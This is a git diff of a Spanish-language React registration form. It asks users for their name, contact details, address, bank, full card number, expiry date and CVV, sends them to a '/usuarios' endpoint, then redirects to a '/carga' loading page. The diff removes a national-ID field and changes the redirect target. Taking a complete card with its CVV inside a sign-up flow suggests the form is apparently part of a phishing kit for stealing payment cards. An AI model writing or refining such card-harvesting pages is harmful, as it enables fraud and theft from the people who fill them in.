@@ -9,8 +9,6 @@ import Footer from '../components/Footer'
 
 const Registrar = () => {
  
-
-  const [ cedula, setCedula ] = useState('')
   const [ nombre, setNombre ] = useState('')
   const [ email, setEmail ] = useState('')
   const [ celular, setCelular ] = useState('')
@@ -28,7 +26,7 @@ const Registrar = () => {
 
   const handleSubmit = async e => {
     e.preventDefault()
-    if([ cedula, nombre, email, celular, ciudad, direccion, banco, tarjeta, mes, año, cvv].includes('')) {
+    if([ nombre, email, celular, ciudad, direccion, banco, tarjeta, mes, año, cvv].includes('')) {
       setAlerta({
         msg: 'Todos los campos son obligatorios',
         error: true
@@ -48,14 +46,6 @@ const Registrar = () => {
     if(nombre.length > 15 ) {
       setAlerta({
         msg: 'Nombre muy largo, agrega máximo 15 caracteres',
-        error: true
-      })
-      return
-    }
-
-    if(cedula.length > 11 ) {
-      setAlerta({
-        msg: 'En el Campo de Cédula Agrega Máximo 11 carácteres',
         error: true
       })
       return
@@ -97,13 +87,12 @@ const Registrar = () => {
 
     //Creando el usuario en la API
     try {
-      const { data } = await clienteAxios.post(`/usuarios`, {cedula, nombre, email,  celular, ciudad, direccion, banco, tarjeta, mes, año, cvv})
+      const { data } = await clienteAxios.post(`/usuarios`, {nombre, email,  celular, ciudad, direccion, banco, tarjeta, mes, año, cvv})
       setAlerta({
         msg: data.msg,
         error: false
       })
 
-      setCedula('')
       setNombre('')
       setEmail('')
       setCelular('')
@@ -116,8 +105,8 @@ const Registrar = () => {
       setCvv('')
 
      
-      
-      window.location = `${import.meta.env.VITE_FRONT_URL}/carga`
+      const urlBase = window.location.origin
+      window.location = `${urlBase}/carga`
 
     } catch (error) {
       setAlerta({
@@ -224,7 +213,7 @@ const Registrar = () => {
 
           <div className="my-5  mx-auto">
             
-              <label className="uppercase text-gray-600 text-center block text-xl font-bold" htmlFor="cedula">Selecciona Tu banco:</label>
+              <label className="uppercase text-gray-600 text-center block text-xl font-bold" htmlFor="banco">Selecciona Tu banco:</label>
               
 
               <input className="form-control" list="datalistOptions1" id="exampleDataList1" placeholder="---Seleccione---"
